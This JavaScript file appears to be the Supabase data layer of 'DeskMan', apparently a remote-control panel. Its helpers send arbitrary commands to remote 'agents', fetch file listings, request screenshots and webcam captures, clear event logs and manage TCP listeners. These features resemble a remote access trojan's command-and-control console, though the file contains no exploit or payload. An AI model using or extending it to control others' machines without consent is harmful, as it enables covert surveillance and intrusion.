// DeskMan Supabase Client
// Initializes the Supabase client and provides data access helpers

let supabase;

function initSupabase() {
    if (DESKMAN_CONFIG.SUPABASE_URL === 'https://YOUR_PROJECT_ID.supabase.co') {
        console.warn('DeskMan: Supabase not configured. Update js/config.js with your project credentials.');
        return false;
    }
    supabase = window.supabase.createClient(
        DESKMAN_CONFIG.SUPABASE_URL,
        DESKMAN_CONFIG.SUPABASE_ANON_KEY
    );
    return true;
}

// ============ AGENTS ============

async function fetchAgents() {
    const { data, error } = await supabase
        .from('agents')
        .select('*')
        .order('created_at', { ascending: true });
    if (error) { console.error('fetchAgents:', error); return []; }
    return data || [];
}

async function fetchAgent(agentId) {
    const { data, error } = await supabase
        .from('agents')
        .select('*')
        .eq('agent_id', agentId)
        .single();
    if (error) { console.error('fetchAgent:', error); return null; }
    return data;
}

function subscribeAgents(callback) {
    return supabase
        .channel('agents-changes')
        .on('postgres_changes', { event: '*', schema: 'public', table: 'agents' }, (payload) => {
            callback(payload);
        })
        .subscribe();
}

// ============ COMMANDS ============

async function sendCommand(agentId, command) {
    const { data, error } = await supabase
        .from('commands')
        .insert({ agent_id: agentId, command: command })
        .select()
        .single();
    if (error) { console.error('sendCommand:', error); return null; }
    return data;
}

async function fetchCommandHistory(agentId, limit = 50) {
    const { data, error } = await supabase
        .from('commands')
        .select('*, command_results(*)')
        .eq('agent_id', agentId)
        .order('created_at', { ascending: false })
        .limit(limit);
    if (error) { console.error('fetchCommandHistory:', error); return []; }
    return data || [];
}

function subscribeCommandResults(callback) {
    return supabase
        .channel('command-results-changes')
        .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'command_results' }, (payload) => {
            callback(payload.new);
        })
        .subscribe();
}

function subscribeCommandStatus(callback) {
    return supabase
        .channel('command-status-changes')
        .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'commands' }, (payload) => {
            callback(payload.new);
        })
        .subscribe();
}

// ============ FILE LISTINGS ============

async function fetchFileListing(agentId, path) {
    const { data, error } = await supabase
        .from('file_listings')
        .select('*')
        .eq('agent_id', agentId)
        .eq('path', path)
        .order('updated_at', { ascending: false })
        .limit(1)
        .single();
    if (error && error.code !== 'PGRST116') { console.error('fetchFileListing:', error); }
    return data;
}

async function requestFileListing(agentId, path) {
    return await sendCommand(agentId, `ls ${path}`);
}

function subscribeFileListings(callback) {
    return supabase
        .channel('file-listings-changes')
        .on('postgres_changes', { event: '*', schema: 'public', table: 'file_listings' }, (payload) => {
            callback(payload);
        })
        .subscribe();
}

// ============ SCREENSHOTS ============

async function fetchLatestScreenshot(agentId) {
    const { data, error } = await supabase
        .from('screenshots')
        .select('*')
        .eq('agent_id', agentId)
        .order('captured_at', { ascending: false })
        .limit(1)
        .single();
    if (error && error.code !== 'PGRST116') { console.error('fetchLatestScreenshot:', error); }
    return data;
}

function getScreenshotUrl(storagePath) {
    const { data } = supabase.storage.from('screenshots').getPublicUrl(storagePath);
    return data?.publicUrl;
}

async function requestScreenshot(agentId) {
    return await sendCommand(agentId, '__screenshot');
}

async function requestWebcam(agentId) {
    return await sendCommand(agentId, '__webcam');
}

function subscribeScreenshots(callback) {
    return supabase
        .channel('screenshots-changes')
        .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'screenshots' }, (payload) => {
            callback(payload.new);
        })
        .subscribe();
}

// ============ EVENT LOGS ============

async function fetchEventLogs(limit = 100) {
    const { data, error } = await supabase
        .from('event_logs')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(limit);
    if (error) { console.error('fetchEventLogs:', error); return []; }
    return (data || []).reverse();
}

async function insertEventLog(message, logType = 'info', agentId = null) {
    const { error } = await supabase
        .from('event_logs')
        .insert({ message, log_type: logType, agent_id: agentId });
    if (error) console.error('insertEventLog:', error);
}

async function clearEventLogs() {
    const { error } = await supabase
        .from('event_logs')
        .delete()
        .neq('id', '00000000-0000-0000-0000-000000000000');
    if (error) console.error('clearEventLogs:', error);
}

function subscribeEventLogs(callback) {
    return supabase
        .channel('event-logs-changes')
        .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'event_logs' }, (payload) => {
            callback(payload.new);
        })
        .subscribe();
}

// ============ LISTENERS ============

async function fetchListeners() {
    const { data, error } = await supabase
        .from('listeners')
        .select('*')
        .order('created_at', { ascending: true });
    if (error) { console.error('fetchListeners:', error); return []; }
    return data || [];
}

async function addListener(port, protocol = 'tcp') {
    const { data, error } = await supabase
        .from('listeners')
        .insert({ port, protocol, status: 'active' })
        .select()
        .single();
    if (error) { console.error('addListener:', error); return null; }
    return data;
}

async function stopListener(port) {
    const { error } = await supabase
        .from('listeners')
        .update({ status: 'stopped' })
        .eq('port', port);
    if (error) console.error('stopListener:', error);
}

async function removeListener(port) {
    const { error } = await supabase
        .from('listeners')
        .delete()
        .eq('port', port);
    if (error) console.error('removeListener:', error);
}
